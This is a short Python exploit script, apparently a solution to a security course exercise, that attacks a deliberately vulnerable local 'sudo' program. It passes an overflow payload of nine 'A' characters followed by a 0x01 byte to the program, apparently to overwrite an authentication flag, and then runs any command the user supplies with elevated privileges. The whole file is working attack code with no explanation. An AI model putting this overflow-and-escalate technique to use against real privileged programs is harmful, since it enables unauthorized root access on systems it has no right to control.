import os
import sys


def run_command(cmd: str, path_to_sudo: str):
    """
    Run the provided command using the vulnerable sudo program.
    """
    payload = "A"*9 + "\x01"
    os.execl(path_to_sudo,path_to_sudo,payload,cmd)


def main(argv):
    # WARNING: Avoid changing this function.
    if not len(argv) == 2:
        print('Usage: %s <command>' % argv[0])
        sys.exit(1)

    cmd = argv[1]
    run_command(cmd, path_to_sudo='./sudo')


if __name__ == '__main__':
    main(sys.argv)
